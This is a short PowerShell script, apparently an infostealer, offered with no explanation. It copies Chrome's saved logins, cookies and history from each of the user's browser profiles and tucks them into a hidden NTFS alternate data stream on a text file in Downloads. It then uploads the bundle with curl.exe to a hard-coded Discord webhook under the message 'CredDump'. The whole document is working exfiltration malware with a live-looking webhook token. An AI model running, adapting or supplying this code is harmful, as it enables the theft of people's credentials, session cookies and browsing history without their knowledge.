$ExfilUrl = "https://discord.com/api/webhooks/1466867070695112909/MhqMGm5FD0UCAe44jq3ho441l5uNeAm_233TujTCkc_ESDaCrxiAPSlMujS2DKtckji6"
$FilePath="$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\"
$UserData = Get-ChildItem -Path $FilePath -Directory
$Profiles = @("Default")
$ProfileData =""
$Cookies = ""
$History = ""
foreach ($Folder in $UserData) {
    $FolderName = $Folder.Name
    if ($FolderName -like "Profile*") {
        $Profiles += $FolderName
}
}
foreach ($ProfileName in $Profiles) {
    $ProfileData += Get-Content -Path "$FilePath\$ProfileName\Login Data"
    $Cookies += Get-Content -Path "$FilePath\$ProfileName\Network\Cookies"
    $History += Get-Content -Path "$FilePath\$ProfileName\History"
}
$ExfilData = $ProfileData + "\n" + "__________________________________________" + "\n" + $Cookies + "\n" + "__________________________________________" + "\n" + $History
$UserDownloadFiles = Get-ChildItem -Path $env:USERPROFILE\Downloads\*.txt
$GiveMeAFile = $UserDownloadFiles[0]
Set-Content -Path $GiveMeAFile -Stream "HiddenCreds" -Value $ExfilData  
$ExfilFile = (Get-Item $GiveMeAFile).FullName+":HiddenCreds"
$payloadJson = @{
    content="CredDump"
}|ConvertTo-Json
curl.exe -F "payload_json=$payloadJson" -F "file1=@$ExfilFile" $ExfilUrl
